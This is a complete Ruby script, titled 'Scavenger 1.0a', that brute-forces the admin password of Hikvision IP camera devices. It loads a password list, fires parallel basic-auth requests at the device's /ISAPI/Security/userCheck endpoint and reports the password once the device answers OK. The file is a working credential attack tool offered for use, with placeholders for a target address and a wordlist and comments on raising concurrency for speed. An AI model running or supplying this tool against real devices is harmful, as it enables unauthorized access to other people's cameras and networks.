#!/usr/bin/ruby

###################################################################################################
#Author 	: Shankar Damodaran								                                                      #
#Codename   	: Scavenger 1.0a								                                                    #
#Description	: A brute force script that attempts to break in Hikvision IP Camera Routers	      #
###################################################################################################


require 'typhoeus'
require 'colorize'


######### Configuration Begins ########

### Subject your target ip address ###
target = 'targetipaddressoftherouter'

### Provide the password list ###
file_path = 'pathtoyourpasswordlist'

######## Configuration Ends ##########


passwords = [] # The passwords list container


puts "Initializing the password list. Please wait...";

# Reading the passwords from the list, cleaning up and storing it in the array.
def read_array(file_path,passwords)
  File.readlines(file_path).map do |line|
       passwords << line.unpack("C*").pack("U*").strip
  end
end

# The actual call to the above method
read_array(file_path,passwords)



time = Time.new

totpasswords = passwords.length

puts "\n#{totpasswords} passwords loaded. \nBruteforce Sequence Initialization Started at #{time.inspect}"


# Chopping the array in certain sets to fasten up parallelization
new_pass = passwords.each_slice((totpasswords/2).round).to_a



# The module that does the parallelization using Typhoeus Hydra
def multi_channel_split(target,req,passwords)
		
		i=0
		j=0

		# The default concurrency is 200, I had it set to 20. Try increasing this parameter to experiment variety of speed.
		hydra = Typhoeus::Hydra.new(max_concurrency: 20)
		
		# I am setting the verbosity and memoisation to 0. Memoisation should be set to false for calls with different set of parameters.
		Typhoeus.configure do |config|
		      config.verbose = false
		      config.memoize = false
		 end
		
		requests = req.times.map {
		  request = Typhoeus::Request.new("http://#{target}/ISAPI/Security/userCheck",						
			                                  method: :get,
			                                  userpwd: "admin:#{passwords[i]}")
		  i+=1
		  hydra.queue(request)
		  request
		  
		}
		
		# Running Hydra every once after piling up the requests from the slice
		hydra.run


		responses = requests.map { |request|
			# If we get a response similar to this means the password has found.
			if request.response.body.index('<statusString>OK</statusString>') != nil
				time = Time.new
		    		puts "\nPassword Found at #{time.inspect}!: #{passwords[j]} \n".green
				abort
			
			end
		j+=1
		
			
		}


end

# The chopped array is subjected here to call the module.
new_pass.each do |req|
	multi_channel_split(target,req.length,req)

end

puts "\nPassword was not found in this list. Subject another file to start a new operation.".red
####################################################################################################
